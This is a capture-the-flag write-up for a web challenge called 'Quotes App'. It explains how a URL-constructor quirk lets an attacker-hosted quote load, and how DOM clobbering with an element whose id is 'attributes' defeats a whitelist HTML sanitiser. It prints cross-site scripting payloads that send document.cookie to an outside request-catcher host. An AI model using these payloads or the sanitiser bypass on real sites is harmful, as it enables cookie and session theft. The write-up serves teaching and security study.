+++
title = "Quotes App"
date = "2025-07-04"
authors = ["Arun Radhakrishnan"]
+++

### Description

We're given the code to a neat little website that chooses a random nice quote to display to you whenever you click the button.
{{ img(id="normal_working.png", alt="Normal working of the app. Random quote is displayed corresponding to the quoteid param in the url.", class="textCenter") }}

### The Solution

Looking around the source code, we find a script called bot.py, which has a function visit_url. The function visits a given url and conveniently places our flag as a cookie before visiting.
In app.py, we see that there's an endpoint called /report. This site allows us to submit any url for our bot to visit. So... all we have to do is, get some site which can run some js code, pick up the cookie and send it to a webhook somewhere.

This is where the first trick comes up. Check this part of the code, where the api is called with the given quoteid param.

```js
function buildApiUrl(baseUrl, quoteId) {
    return new URL(quoteId, `${window.location.origin}${baseUrl}`).toString();
}

async function fetchQuote(id) {
    try {
        const url = buildApiUrl("/api/quotes/", id);
        const response = await fetch(url, { method: "GET" });

        if (!response.ok) {
            throw new Error("Quote not found.");
        }

        const data = await response.json();
        return data.quote;
    } catch (error) {
        throw error;
    }
}
```

Specifically, this line:

```js
return new URL(quoteId, `${window.location.origin}${baseUrl}`).toString();
```

The URL function creates a url from the second param (base location) treating the first param as a relative path from the base location. But if the first parameter itself is a full URL, then it is just returned as is.
So... we can just enter any website in /?quoteid=\<enter any website here\>, and the fetchQuote function will return just the quote value from the response and then give it back out to us.

This should make our solution pretty easy now. Just use some vps that can send custom responses, and feed that website as quoteid. In the response JSON that you send, place an item with key as quote and value as a script tag. Inside the script tag, write some js code to send document.cookie to a webhook of your choice.

```json
{
    "quote": "<script type=\"javascript\">window.location = \"https:\\alpha.requestcatcher.com\test?flag=\" + document.cookie;<\script>"
}
```

Something like this should work well enough.

Except... before the quote value is displayed, it gets sanitised thoroughly - specifically checking against malicious HTML.
sanitiser.js contains the following code:

```js
const DefaultWhitelist = {
    '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],
    a: ['target', 'href', 'title', 'rel'],
    area: [],
    b: [],
    br: [],
    // more such values are there, check the full code for the whole list
}

function sanitizeHtml(unsafeHtml, whiteList) {
    if (unsafeHtml.length === 0) {
      return unsafeHtml
    }
    
    if (whiteList === undefined) {
      whiteList = DefaultWhitelist
    }

    const domParser = new window.DOMParser()
    const createdDocument = domParser.parseFromString(unsafeHtml, 'text/html')
    const whitelistKeys = Object.keys(whiteList)
    const elements = [].slice.call(createdDocument.body.querySelectorAll('*'))
  
    for (let i = 0, len = elements.length; i < len; i++) {
      const el = elements[i]
      const elName = el.nodeName.toLowerCase()  
      if (whitelistKeys.indexOf(el.nodeName.toLowerCase()) === -1) {
        el.parentNode.removeChild(el)
        continue
      }
  
      const attributeList = [].slice.call(el.attributes)
      const whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || [])
  
      attributeList.forEach((attr) => {
        if (!allowedAttribute(attr, whitelistedAttributes)) {
          el.removeAttribute(attr.nodeName)
        }
      })
    }
     
    return createdDocument.body.innerHTML
}
```

Essentially, the above code treats the quote value as HTML code, and checks each element individually. If the tag is not in the whitelist (and yes, \<script\> is not included in the whitelist), then the element is removed. Furthermore, all attributes of the element that are not in the whitelist are also removed (notably all onload, onfocus etc. attributes are removed).

Lucky for us though, there is a second very subtle trick to get around this constraint.

Look at the line:

```js
const attributeList = [].slice.call(el.attributes)
```

Logically, this line creates a list of all attributes of the element el.

However, this dot syntax under DOM has several meanings. Notably, if el had a child element of id x, then el.x would refer to that child.
So... hypothetically, if someone made a child element of id = attributes, then el.attributes would start to refer to the child. And in this hypothetical scenario, el.attributes would no longer contain the list of all attributes to be removed by the whitelist.

There's the trick. Instead of using a script tag, we can use a different (whitelisted) tag, say a form tag. We'll have to include a child element (say an input tag) with id = attributes, to avoid the sanitisation. And then we can use any attribute in the form tag, such as the onfocus and autofocus attributes.

```json
{"quote": "<form id=x onfocus=\'window.location=\\\"https://alpha.requestcatcher.com/test?flag=\\\"+document.cookie\' autofocus><input id=attributes>"}
```

This should work just about perfect.

### Trying it out

I used pythonanywhere to send in my custom responses. I put in a custom cookie on a tab and opened the main webpage with my custome quoteid. Here's what happened.
{{ img(id="just_before_entering_url.png", alt="Screenshot of webpage before entering the malicious url. Also shows my custom cookie in the inspect tab", class="textCenter") }}
{{ img(id="request_caught.png", alt="Shows the request being captured with the cookie shown as a parameter", class="textCenter") }}

Now, we just have to take this whole URL (https://\<enter taskurl here\>/?quoteid=\<enter custom response site here\>) and give it to our helpful bot under the /report page. And that's it, flag acquired.

### Bibliography

Thanks to Solo_Way / Little computer demons and their writeup (<https://ctftime.org/writeup/40313>) for a great explanation of the solution. All the new tricks mentioned here were taken from their writeup.
